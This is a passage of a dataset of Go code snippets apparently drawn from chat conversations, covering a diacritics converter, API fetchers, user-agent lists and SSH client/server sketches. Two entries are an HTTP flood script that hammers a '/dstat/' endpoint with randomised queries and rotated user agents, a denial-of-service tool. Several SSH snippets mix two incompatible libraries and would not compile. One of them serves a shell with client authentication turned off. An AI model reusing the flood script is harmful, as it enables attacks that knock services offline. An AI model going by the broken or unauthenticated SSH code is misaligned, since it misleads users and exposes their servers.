    "code": "// +build utf8\n\npackage main\n\nimport (\n\t\"flag\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"strings\"\n\t\"path/filepath\"\n)\n\nvar ogonki = map[string]string{\n\t\"pl\": \"ąćłńóśźżęĄĆŁŃÓŚŹŻĘ\",\n\t\"de\": \"äöüßÄÖÜẞ\",\n\t\"fr\": \"éèàçêôûÉÈÀÇÊÔÛ\",\n\t\"es\": \"áíóúéüñÁÍÓÚÉÜÑ\",\n\t\"it\": \"àèéìòùÀÈÉÌÒÙ\",\n\t\"cz\": \"čďěňřšťůýžČĎĚŇŘŠŤŮÝŽ\",\n\t\"hu\": \"áéíóöőúüűÁÉÍÓÖŐÚÜŰ\",\n\t\"se\": \"åäöÅÄÖ\",\n\t\"dk\": \"æøåÆØÅ\",\n\t\"no\": \"æøåÆØÅ\",\n\t\"fi\": \"äöÄÖ\",\n}\n\nfunc main() {\n\tflagHelp := flag.Bool(\"help\", false, \"View Help\")\n\tflagLang := flag.String(\"lang\", \"pl\", \"The language of diacritic marks: (pl, de, fr, es, it, cz, hu, se, dk, no, fi)\")\n\n\tflag.Parse()\n\n\tif *flagHelp {\n\t\tprintHelp()\n\t\treturn\n\t}\n\n\tinputFiles := flag.Args()\n\n\tif len(inputFiles) == 0 {\n\t\tfmt.Println(\"OGONKI => Error: No file path specified. Displaying help: OGONKI -help\")\n\t\treturn\n\t}\n\n\tfor _, inputFile := range inputFiles {\n\t\tfileExt := strings.ToLower(filepath.Ext(inputFile))\n\t\tswitch fileExt {\n\t\tcase \".txt\", \".html\", \".htm\", \".csv\", \".svg\", \".srt\", \".yaml\", \".xml\", \".json\", \".log\", \".cpp\", \".js\", \".c\", \".go\", \".java\", \".py\", \".php\", \".css\", \".sql\", \".md\", \".bat\", \".ini\", \".cfg\", \".tex\", \".properties\", \".sh\", \".cs\", \".ts\", \".rb\", \".swift\", \".r\", \".lua\", \".pl\", \".scala\", \".matlab\", \".kotlin\", \".rust\", \".shell\":\n\t\t\tcontent, err := ioutil.ReadFile(inputFile)\n\t\t\tif err != nil {\n\t\t\t\tfmt.Printf(\"Error loading file %s: %s\\n\", inputFile, err)\n\t\t\t\tcontinue\n\t\t\t}\n\n\t\t\tnewContent := replaceOgonki(string(content), *flagLang)\n\n\t\t\toutputFile := strings.TrimSuffix(inputFile, \".txt\") + \"_modified.txt\"\n\n\t\t\terr = ioutil.WriteFile(outputFile, []byte(newContent), 0644)\n\t\t\tif err != nil {\n\t\t\t\tfmt.Printf(\"Error for adding support access paths %s: %s\\n\", outputFile, err)\n\t\t\t\tcontinue\n\t\t\t}\n\n\t\t\tfmt.Printf(\"Diacritics swap completed successfully. New file saved as %s.\\n\", outputFile)\n\t\tdefault:\n\t\t\tfmt.Printf(\"Unsupported file format: %s\\n\", fileExt)\n\t\t}\n\t}\n}\n\nfunc replaceOgonki(text string, lang string) string {\n\togonkiLetters, ok := ogonki[lang]\n\tif !ok {\n\t\tfmt.Printf(\"Error: Unknown diacritics language %s.\\n\", lang)\n\t\treturn text\n\t}\n\n\tfor _, ogonkiLetter := range ogonkiLetters {\n\t\treplacement := string(ogonkiLetter)\n\t\ttext = strings.ReplaceAll(text, replacement, getReplacement(replacement))\n\t}\n\treturn text\n}\n\nfunc getReplacement(letter string) string {\n\tswitch letter {\n\tcase \"ą\":\n\t\treturn \"a\"\n\tcase \"ć\":\n\t\treturn \"c\"\n\tcase \"ę\":\n\t\treturn \"e\"\n\tcase \"ł\":\n\t\treturn \"l\"\n\tcase \"ń\":\n\t\treturn \"n\"\n\tcase \"ó\":\n\t\treturn \"o\"\n\tcase \"ś\":\n\t\treturn \"s\"\n\tcase \"ź\":\n\t\treturn \"z\"\n\tcase \"ż\":\n\t\treturn \"z\"\n\tcase \"Ą\":\n\t\treturn \"A\"\n\tcase \"Ć\":\n\t\treturn \"C\"\n\tcase \"Ę\":\n\t\treturn \"E\"\n\tcase \"Ł\":\n\t\treturn \"L\"\n\tcase \"Ń\":\n\t\treturn \"N\"\n\tcase \"Ó\":\n\t\treturn \"O\"\n\tcase \"Ś\":\n\t\treturn \"S\"\n\tcase \"Ź\":\n\t\treturn \"Z\"\n\tcase \"Ż\":\n\t\treturn \"Z\"\n\t}\n\treturn letter\n}\n\nfunc printHelp() {\n\tfmt.Println()\n\tfmt.Println(\"     _/_/      _/_/_/    _/_/    _/      _/  _/    _/  _/_/_/  \")\n\tfmt.Println(\"  _/    _/  _/        _/    _/  _/_/    _/  _/  _/      _/      \")\n\tfmt.Println(\" _/    _/  _/  _/_/  _/    _/  _/  _/  _/  _/_/        _/       \")\n\tfmt.Println(\"_/    _/  _/    _/  _/    _/  _/    _/_/  _/  _/      _/     \")\n\tfmt.Println(\" _/_/      _/_/_/    _/_/    _/      _/  _/    _/  _/_/_/    \")\n\tfmt.Println()\n\tfmt.Println(\"OGONKI v1.0 (c) by Łukasz Wójcik\")\n\tfmt.Println(\"Program for converting diacritical characters in unformatted text files.\")\n\tfmt.Println()\n\tfmt.Println(\"It supports languages: Polish, Spanish, German, French, Italian, Czech, Hungarian, Swedish, Danish, Norwegian, Finnish\")\n\tfmt.Println()\n\tfmt.Println(\"Use: ogonki [-help] [-lang flag] [file1.txt file2.txt ...]\")\n\tfmt.Println(\"Flags: [pl] [es] [de] [fr] [it] [cz] [hu] [se] [dk] [no] [fi]\")\n\tfmt.Println(\"Example: ogonki -lang fr file.txt\")\n\tfmt.Println()\n\tflag.PrintDefaults()\n\tfmt.Println()\n\tfmt.Println(\"Site:\")\n\tfmt.Println(\"https://github.com/lukaszwojcikdev/ogonki.git\")\n}",
    "filename": "3eb076d90b2400f2756be0c30614cfe4_0.go"
  },
  {
    "conversation_hash": "bdebb0225468e0ec3b2ea49bb9d34d85",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func replaceOgonki(text string, lang string) string {\n\togonkiLetters, ok := ogonki[lang]\n\tif !ok {\n\t\tfmt.Printf(\"Error: Unknown diacritics language %s.\\n\", lang)\n\t\treturn text\n\t}\n\n\tfor _, ogonkiLetter := range ogonkiLetters {\n\t\treplacement := string(ogonkiLetter)\n\t\ttext = strings.ReplaceAll(text, replacement, getReplacement(string(ogonkiLetter)))\n\t}\n\treturn text\n}",
    "filename": "bdebb0225468e0ec3b2ea49bb9d34d85_0.go"
  },
  {
    "conversation_hash": "0bec909a3251ec0d160ccbb50e0229c8",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"encoding/csv\"\n    \"encoding/json\"\n    \"fmt\"\n    \"net/http\"\n    \"os\"\n)\n\ntype PixabayResponse struct {\n    Hits []Image `json:\"hits\"`\n}\n\ntype Image struct {\n    ID       int    `json:\"id\"`\n    PreviewURL string `json:\"previewURL\"`\n    Tags string `json:\"tags\"`\n}\n\nfunc main() {\n    // Tworzenie zapytania HTTP do API Pixabay.com\n    response, err := http.Get(\"https://pixabay.com/api/?key=YOUR_API_KEY&per_page=10\")\n    if err != nil {\n        fmt.Println(\"Błąd w trakcie wysyłania zapytania do API:\", err)\n        return\n    }\n    defer response.Body.Close()\n\n    // Dekodowanie odpowiedzi JSON z API\n    var data PixabayResponse\n    err = json.NewDecoder(response.Body).Decode(&data)\n    if err != nil {\n        fmt.Println(\"Błąd w trakcie dekodowania odpowiedzi JSON:\", err)\n        return\n    }\n\n    // Tworzenie pliku CSV\n    file, err := os.Create(\"images.csv\")\n    if err != nil {\n        fmt.Println(\"Błąd w trakcie tworzenia pliku CSV:\", err)\n        return\n    }\n    defer file.Close()\n\n    // Inicjalizowanie zapisywania jako CSV\n    writer := csv.NewWriter(file)\n    defer writer.Flush()\n\n    // Zapisywanie wierszy do pliku CSV\n    for _, image := range data.Hits {\n        row := []string{fmt.Sprintf(\"%d\", image.ID), image.PreviewURL, image.Tags}\n        err := writer.Write(row)\n        if err != nil {\n            fmt.Println(\"Błąd w trakcie zapisywania wiersza do pliku CSV:\", err)\n            return\n        }\n    }\n\n    fmt.Println(\"Pobrano obrazy ze strony Pixabay.com i zapisano do pliku images.csv\")\n}",
    "filename": "0bec909a3251ec0d160ccbb50e0229c8_0.go"
  },
  {
    "conversation_hash": "681f910b276718a0ad9902fa3fde4524",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc printNumber(n int) {\n    fmt.Println(\"The number is:\", n)\n}\n\nfunc main() {\n    number := 42\n    printNumber(number)\n}",
    "filename": "681f910b276718a0ad9902fa3fde4524_0.go"
  },
  {
    "conversation_hash": "95b348f45253e9122a6238c14aeb4c3f",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"math/rand\"\n\t\"net/http\"\n\t\"strconv\"\n\t\"time\"\n)\n\nfunc httpFlood(UAs []string, duration int64, startTime int64) {\n\tfor time.Now().Unix() <= startTime+duration {\n\n\t\trandNum := strconv.Itoa(rand.Int())\n\t\turl := \"127.0.0.1:8080/dstat/\" + \"?page=\" + randNum\n\n\t\tUA := UAs[rand.Intn(len(UAs))]\n\n\t\treq, _ := http.NewRequest(\"GET\", url, nil)\n\t\treq.Header.Set(\"User-Agent\", UA)\n\n\t\thttp.DefaultClient.Do(req)\n\n\t}\n}\n\nfunc main() {\n\tuserAgents := []string{\n\t\t\"Dalvik/1.6.0 (Linux; U; Android 4.1.1; NX008HD8G Build/JRO03C)\",\n\t\t\"Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36\",\n\t\t\"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4168.1 Safari/537.36\",\n\t\t\"Dalvik/1.6.0 (Linux; U; Android 4.2.2; CX_718 Build/JDQ39)\",\n\t\t\"Mozilla/5.0 (Linux; Android 8.1.0; C210AE Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36\",\n\t\t\"Mozilla/5.0 (Linux; Android 6.0; Lenovo TB3-850M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Safari/537.36\",\n\t\t\"Mozilla/5.0 (Linux; Android 9; Redmi Note 8T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36\",\n\t\t\"Mozilla/5.0 (Linux; Android 7.0; itel S41) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36\",\n\t\t\"Dalvik/2.1.0 (Linux; U; Android 10; 706SH Build/S2005)\",\n\t\t\"Mozilla/5.0 (Linux; arm; Android 9; SM-J415FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 YaApp_Android/10.92 YaSearchBrowser/10.92 BroPP/1.0 SA/1 Mobile Safari/537.36\",\n\t}\n\n\tthreads := 1 // Localhost - 3\n\tduration := int64(10)\n\n\tstartTime := time.Now().Unix()\n\n\tfor i := 0; i < threads-1; i++ {\n\t\tgo httpFlood(userAgents, duration, startTime)\n\t}\n\n\thttpFlood(userAgents, duration, startTime)\n}",
    "filename": "95b348f45253e9122a6238c14aeb4c3f_4.go"
  },
  {
    "conversation_hash": "95b348f45253e9122a6238c14aeb4c3f",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"math/rand\"\n\t\"net/http\"\n\t\"strconv\"\n\t\"time\"\n)\n\nfunc httpFlood(UAs []string, duration int64, startTime int64) {\n\tfor time.Now().Unix() <= startTime+duration {\n\n\t\trandNum := strconv.Itoa(rand.Int())\n\t\turl := \"127.0.0.1:8080/dstat/\" + \"?page=\" + randNum\n\n\t\tUA := UAs[rand.Intn(len(UAs))]\n\n\t\treq, _ := http.NewRequest(\"GET\", url, nil)\n\t\treq.Header.Set(\"User-Agent\", UA)\n\n\t\thttp.DefaultClient.Do(req)\n\n\t}\n}\n\nfunc main() {\n\tuserAgents := []string{\n\t\t\"Dalvik/1.6.0 (Linux; U; Android 4.1.1; NX008HD8G Build/JRO03C)\",\n\t\t\"Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36\",\n\t\t\"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4168.1 Safari/537.36\",\n\t\t\"Dalvik/1.6.0 (Linux; U; Android 4.2.2; CX_718 Build/JDQ39)\",\n\t\t\"Mozilla/5.0 (Linux; Android 8.1.0; C210AE Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36\",\n\t\t\"Mozilla/5.0 (Linux; Android 6.0; Lenovo TB3-850M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Safari/537.36\",\n\t\t\"Mozilla/5.0 (Linux; Android 9; Redmi Note 8T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36\",\n\t\t\"Mozilla/5.0 (Linux; Android 7.0; itel S41) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36\",\n\t\t\"Dalvik/2.1.0 (Linux; U; Android 10; 706SH Build/S2005)\",\n\t\t\"Mozilla/5.0 (Linux; arm; Android 9; SM-J415FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 YaApp_Android/10.92 YaSearchBrowser/10.92 BroPP/1.0 SA/1 Mobile Safari/537.36\",\n\t}\n\n\tthreads := 1 // Localhost - 3\n\tduration := int64(10)\n\n\tstartTime := time.Now().Unix()\n\n\tfor i := 0; i < threads-1; i++ {\n\t\tgo httpFlood(userAgents, duration, startTime)\n\t}\n\n\thttpFlood(userAgents, duration, startTime)\n}",
    "filename": "95b348f45253e9122a6238c14aeb4c3f_5.go"
  },
  {
    "conversation_hash": "a0ca9c0564800f3b77b0c8b456fcb42e",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"log\"\n\t\"net/http\"\n)\n\ntype UserAgent struct {\n\tID     int    `json:\"id\"`\n\tAgent  string `json:\"user_agent\"`\n\tSource string `json:\"source\"`\n}\n\nfunc getUserAgents() {\n\turl := \"http://127.0.0.1:5000/api/get_ua\"\n\n\tresp, err := http.Get(url)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer resp.Body.Close()\n\n\tvar userAgents []UserAgent\n\n\terr = json.NewDecoder(resp.Body).Decode(&userAgents)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tfor _, ua := range userAgents {\n\t\tfmt.Printf(\"ID: %d\\nAgent: %s\\nSource: %s\\n\\n\", ua.ID, ua.Agent, ua.Source)\n\t}\n}\n\nfunc main() {\n\tgetUserAgents()\n}",
    "filename": "a0ca9c0564800f3b77b0c8b456fcb42e_0.go"
  },
  {
    "conversation_hash": "a0ca9c0564800f3b77b0c8b456fcb42e",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"log\"\n\t\"net/http\"\n)\n\ntype Response struct {\n\tUserAgents []string `json:\"user_agents\"`\n}\n\nfunc getUserAgents() {\n\turl := \"http://localhost:5000/api/get_ua\"\n\n\tresp, err := http.Get(url)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer resp.Body.Close()\n\n\tvar response Response\n\n\terr = json.NewDecoder(resp.Body).Decode(&response)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tfor _, ua := range response.UserAgents {\n\t\tfmt.Println(ua)\n\t}\n}\n\nfunc main() {\n\tgetUserAgents()\n}",
    "filename": "a0ca9c0564800f3b77b0c8b456fcb42e_2.go"
  },
  {
    "conversation_hash": "f8b970a113d011332abddb980be3b230",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"log\"\n\t\"net/http\"\n)\n\ntype Response struct {\n\tUserAgents []string `json:\"user_agents\"`\n}\n\nfunc getUserAgents() []string {\n\t// Replace this with your API endpoint URL\n\turl := \"http://localhost:5000/api/get_ua\"\n\n\tresp, err := http.Get(url)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer resp.Body.Close()\n\n\tvar response Response\n\n\terr = json.NewDecoder(resp.Body).Decode(&response)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\treturn response.UserAgents\n}\n\nfunc main() {\n\tuserAgents := getUserAgents()\n\n\t// Hardcoded example user_agents\n\t// userAgents := []string{\n\t// \t\"Dalvik/1.6.0 (Linux; U; Android 4.1.1; NX008HD8G Build/JRO03C)\",\n\t// \t\"Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36\",\n\t// \t\"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4168.1 Safari/537.36\",\n\t// \t\"Dalvik/1.6.0 (Linux; U; Android 4.2.2; CX_718 Build/JDQ39)\",\n\t// \t\"Mozilla/5.0 (Linux; Android 8.1.0; C210AE Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36\",\n\t// \t\"Mozilla/5.0 (Linux; Android 6.0; Lenovo TB3-850M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Safari/537.36\",\n\t// \t\"Mozilla/5.0 (Linux; Android 9; Redmi Note 8T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36\",\n\t// \t\"Mozilla/5.0 (Linux; Android 7.0; itel S41) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36\",\n\t// \t\"Dalvik/2.1.0 (Linux; U; Android 10; 706SH Build/S2005)\",\n\t// \t\"Mozilla/5.0 (Linux; arm; Android 9; SM-J415FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 YaApp_Android/10.92 YaSearchBrowser/10.92 BroPP/1.0 SA/1 Mobile Safari/537.36\",\n\t// }\n\n\tfor _, ua := range userAgents {\n\t\tfmt.Println(ua)\n\t}\n}",
    "filename": "f8b970a113d011332abddb980be3b230_0.go"
  },
  {
    "conversation_hash": "f8b970a113d011332abddb980be3b230",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"log\"\n\t\"net/http\"\n)\n\ntype UAResponse struct {\n\tUserAgents []string `json:\"user_agents\"`\n}\n\nfunc getUserAgents() []string {\n\t// Replace this with your API endpoint URL\n\turl := \"http://localhost:5000/api/get_ua\"\n\n\tresp, err := http.Get(url)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer resp.Body.Close()\n\n\tvar response UAResponse\n\n\terr = json.NewDecoder(resp.Body).Decode(&response)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\treturn response.UserAgents\n}\n\nfunc main() {\n\tuserAgents := getUserAgents()\n\n\t// Hardcoded example user_agents\n\t// userAgents := []string{\n\t// \t\"Dalvik/1.6.0 (Linux; U; Android 4.1.1; NX008HD8G Build/JRO03C)\",\n\t// \t\"Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36\",\n\t// \t\"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4168.1 Safari/537.36\",\n\t// \t\"Dalvik/1.6.0 (Linux; U; Android 4.2.2; CX_718 Build/JDQ39)\",\n\t// \t\"Mozilla/5.0 (Linux; Android 8.1.0; C210AE Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36\",\n\t// \t\"Mozilla/5.0 (Linux; Android 6.0; Lenovo TB3-850M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Safari/537.36\",\n\t// \t\"Mozilla/5.0 (Linux; Android 9; Redmi Note 8T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36\",\n\t// \t\"Mozilla/5.0 (Linux; Android 7.0; itel S41) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36\",\n\t// \t\"Dalvik/2.1.0 (Linux; U; Android 10; 706SH Build/S2005)\",\n\t// \t\"Mozilla/5.0 (Linux; arm; Android 9; SM-J415FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 YaApp_Android/10.92 YaSearchBrowser/10.92 BroPP/1.0 SA/1 Mobile Safari/537.36\",\n\t// }\n\n\tfor _, ua := range userAgents {\n\t\tfmt.Println(ua)\n\t}\n}",
    "filename": "f8b970a113d011332abddb980be3b230_2.go"
  },
  {
    "conversation_hash": "a47f14780f597b30e686411fd2b1bed2",
    "code_index": 0,
    "language": "Go",
    "libraries": [
      "stdin",
      "the"
    ],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"io\"\n\t\"io/ioutil\"\n\t\"log\"\n\t\"os\"\n\n\t\"golang.org/x/crypto/ssh\"\n)\n\nfunc main() {\n\t// Change these values to match your server's configuration\n\tserver := \"your-server.com\"\n\tport := \"22\"\n\tusername := \"your-username\"\n\tkeyPath := \"/path/to/your/private/key\"\n\n\tkey, err := ioutil.ReadFile(keyPath)\n\tif err != nil {\n\t\tlog.Fatalf(\"Failed to read key file: %v\", err)\n\t}\n\n\tsigner, err := ssh.ParsePrivateKey(key)\n\tif err != nil {\n\t\tlog.Fatalf(\"Failed to parse key: %v\", err)\n\t}\n\n\tconfig := &ssh.ClientConfig{\n\t\tUser: username,\n\t\tAuth: []ssh.AuthMethod{\n\t\t\tssh.PublicKeys(signer),\n\t\t},\n\t}\n\n\tconn, err := ssh.Dial(\"tcp\", server+\":\"+port, config)\n\tif err != nil {\n\t\tlog.Fatalf(\"Failed to connect to server: %v\", err)\n\t}\n\tdefer conn.Close()\n\n\tsession, err := conn.NewSession()\n\tif err != nil {\n\t\tlog.Fatalf(\"Failed to create session: %v\", err)\n\t}\n\tdefer session.Close()\n\n\t// Set the input and output of the session to be the current terminal\n\tsession.Stdout = os.Stdout\n\tsession.Stderr = os.Stderr\n\tsession.Stdin = os.Stdin\n\n\tgo func() {\n\t\t// Copy the input from the terminal to the session\n\t\tif _, err := io.Copy(session.Stdin, os.Stdin); err != nil {\n\t\t\tlog.Fatalf(\"Unable to read from stdin: %v\", err)\n\t\t}\n\t}()\n\n\t// Start a shell on the remote server\n\tif err := session.Shell(); err != nil {\n\t\tlog.Fatalf(\"Failed to start shell: %v\", err)\n\t}\n\n\t// Wait for the session to end\n\tif err := session.Wait(); err != nil {\n\t\tlog.Fatalf(\"Session exited with error: %v\", err)\n\t}\n\n\tfmt.Println(\"Disconnected\")\n}",
    "filename": "a47f14780f597b30e686411fd2b1bed2_0.go"
  },
  {
    "conversation_hash": "a47f14780f597b30e686411fd2b1bed2",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"log\"\n\t\"os\"\n\n\t\"github.com/gliderlabs/ssh\"\n)\n\nfunc main() {\n\t// Change these values to match your server's configuration\n\tport := \"22\"\n\tusername := \"your-username\"\n\tkeyPath := \"/path/to/your/private/key\"\n\n\tprivateBytes, err := ioutil.ReadFile(keyPath)\n\tif err != nil {\n\t\tlog.Fatalf(\"Failed to read key file: %v\", err)\n\t}\n\n\tprivateKey, err := ssh.ParsePrivateKey(privateBytes)\n\tif err != nil {\n\t\tlog.Fatalf(\"Failed to parse key: %v\", err)\n\t}\n\n\tssh.Handle(func(s ssh.Session) {\n\t\t// Set the input and output of the session to be the current terminal\n\t\ts.Stdout = os.Stdout\n\t\ts.Stderr = os.Stderr\n\t\ts.Stdin = os.Stdin\n\n\t\t// Start a shell on the remote server\n\t\tif err := s.Shell(); err != nil {\n\t\t\tlog.Fatalf(\"Failed to start shell: %v\", err)\n\t\t}\n\t})\n\n\t// Start the SSH server\n\tserverConfig := &ssh.ServerConfig{\n\t\tNoClientAuth: true, // If you want to enforce authentication, set this to false\n\t}\n\n\tserverConfig.AddHostKey(privateKey)\n\n\terr = ssh.ListenAndServe(\":\"+port, nil, serverConfig)\n\tif err != nil {\n\t\tlog.Fatalf(\"Failed to start SSH server: %v\", err)\n\t}\n\n\tfmt.Println(\"SSH server started on port\", port)\n}",
    "filename": "a47f14780f597b30e686411fd2b1bed2_1.go"
  },
  {
    "conversation_hash": "118de027b212c9bb526b9427589276c7",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"strings\"\n\t\"os\"\n\t\"io/ioutil\"\n\t\"golang.org/x/crypto/ssh\"\n\t\"github.com/gliderlabs/ssh\"\n)",
    "filename": "118de027b212c9bb526b9427589276c7_1.go"
  },
  {
    "conversation_hash": "118de027b212c9bb526b9427589276c7",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "func validateUser(username, password string) bool {\n\tfor _, user := range users {\n\t\tif user.Username == username && user.Password == password {\n\t\t\treturn true\n\t\t}\n\t}\n\treturn false\n}",
    "filename": "118de027b212c9bb526b9427589276c7_4.go"
  },
  {
    "conversation_hash": "118de027b212c9bb526b9427589276c7",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "func handleHelp(session ssh.Session) {\n\tsession.Write([]byte(\"Available commands:\\n\"))\n\tsession.Write([]byte(\"  help   - Shows all commands including this one with descriptions\\n\"))\n\tsession.Write([]byte(\"  whoami - Displays your username\\n\"))\n\tsession.Write([]byte(\"  clear  - Clears screen and displays welcome message\\n\"))\n}\n\nfunc handleWhoAmI(session ssh.Session) {\n\tuser := session.User()\n\tsession.Write([]byte(fmt.Sprintf(\"Username: %s\\n\", user)))\n}\n\nfunc handleClear(session ssh.Session) {\n\tsession.Write([]byte(\"\\033[2J\")) // Clear screen\n\tsession.Write([]byte(fmt.Sprintf(\"Welcome, %s!\\n\", session.User())))\n}\n\nfunc handleSession(session ssh.Session) {\n\tdefer session.Close()\n\n\tcmd := strings.TrimSpace(string(session.RawCommand()))\n\tswitch cmd {\n\tcase \"help\":\n\t\thandleHelp(session)\n\tcase \"whoami\":\n\t\thandleWhoAmI(session)\n\tcase \"clear\":\n\t\thandleClear(session)\n\tdefault:\n\t\tsession.Write([]byte(\"Unknown command. Type 'help' for available commands.\\n\"))\n\t}\n}",
    "filename": "118de027b212c9bb526b9427589276c7_5.go"
  },
  {
    "conversation_hash": "118de027b212c9bb526b9427589276c7",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n\tssh.Handle(handleSession)\n\n\tprivateBytes, err := ioutil.ReadFile(\"id_rsa\") // Private key file path\n\tif err != nil {\n\t\tlog.Fatalf(\"Failed to load private key: %v\", err)\n\t}\n\n\tprivate, err := ssh.ParsePrivateKey(privateBytes)\n\tif err != nil {\n\t\tlog.Fatalf(\"Failed to parse private key: %v\", err)\n\t}\n\n\tconfig := &ssh.ServerConfig{\n\t\tPasswordCallback: func(conn ssh.ConnMetadata, password []byte) (*ssh.Permissions, error) {\n\t\t\tif validateUser(conn.User(), string(password)) {\n\t\t\t\treturn nil, nil\n\t\t\t}\n\t\t\treturn nil, fmt.Errorf(\"authentication failed\")\n\t\t},\n\t}\n\tconfig.AddHostKey(private)\n\n\tlog.Println(\"Starting SSH server on port 22...\")\n\tlog.Fatal(ssh.ListenAndServe(\":22\", nil, config))\n}",
    "filename": "118de027b212c9bb526b9427589276c7_6.go"
  },
  {
    "conversation_hash": "261c6c20abdfc4e1b275aa9777469f7c",
    "code_index": 0,
    "language": "Go",
    "libraries": [
      "a"
    ],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"log\"\n\t\"strings\"\n\n\t\"golang.org/x/crypto/ssh\"\n)\n\ntype User struct {\n\tUsername string `json:\"username\"`\n\tPassword string `json:\"password\"`\n}\n\ntype Config struct {\n\tUsers []User `json:\"users\"`\n}\n\nfunc main() {\n\t// Load the users from a JSON file\n\tusers, err := loadUsers(\"users.json\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Start the SSH server\n\terr = ssh.ListenAndServe(\":2222\", nil, ssh.PasswordAuth(func(ctx ssh.Context, pass string) bool {\n\t\t// Check if the provided username and password matches a user in the list\n\t\tfor _, user := range users {\n\t\t\tif ctx.User() == user.Username && pass == user.Password {\n\t\t\t\treturn true\n\t\t\t}\n\t\t}\n\t\treturn false\n\t}), ssh.KeyboardInteractive(func(ctx ssh.Context, challenger ssh.KeyboardInteractiveChallenge) bool {\n\t\tlog.Print(\"keyboard interactive not supported\")\n\t\treturn false\n\t}))\n\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}\n\nfunc loadUsers(filename string) ([]User, error) {\n\tfile, err := ioutil.ReadFile(filename)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tvar config Config\n\terr = json.Unmarshal(file, &config)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\treturn config.Users, nil\n}",
